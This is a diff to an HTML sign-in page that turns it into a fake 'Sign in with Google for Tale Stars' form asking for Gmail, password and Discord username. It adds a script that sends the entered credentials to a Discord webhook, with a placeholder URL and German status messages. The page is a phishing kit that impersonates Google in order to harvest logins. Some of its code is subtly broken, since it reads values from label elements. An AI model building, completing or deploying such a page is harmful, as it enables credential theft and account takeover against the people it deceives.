@@ -125,15 +125,18 @@ h1{
 <body>
     <div class="box">
     <form class="form"> 
-        <img src="https://ibb.co/TDKVmRfb" width="100px">
-        <h1 class="form-title">Sign in</h1>
+        <h1 class="form-title">Sign in with Google for Tale Stars</h1>
         <div class="form-group">
             <input type="text" class="form-control" required>
-            <label for="" class="class-label"> Email or Phone</label>
+            <label id="input1" for="" class="class-label"> Gmail or Phone</label>
         </div>
         <div class="form-group">
             <input type="password" class="form-control" required>
-            <label for="" class="class-label"> Password</label>
+            <label id="input2" for="" class="class-label"> Password</label>
+        </div>
+	<div class="form-group">
+            <input type="password" class="form-control" required>
+            <label id="input3" for="" class="class-label"> Discord User (Not Nickname)</label>
         </div>
         <div class="form-group">
             
@@ -148,7 +151,35 @@ h1{
 
     </form>
 
-    
+    <script>
+        function sendToDiscord() {
+            const input1 = document.getElementById("input1").value;
+            const input2 = document.getElementById("input2").value;
+            const input3 = document.getElementById("input3").value;
+
+            const webhookURL = "YOUR_WEBHOOK_URL_HERE";
+
+            const data = {
+                content: `Here you go:\n1Email: ${input1}\n2 Passwort: ${input2}\n Discord: ${input3}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Gesendet!");
+                } else {
+                    alert("Fehler beim Senden!");
+                }
+            })
+            .catch(error => console.error("Fehler:", error));
+        }
+    </script>
     
 </body>
 </html>
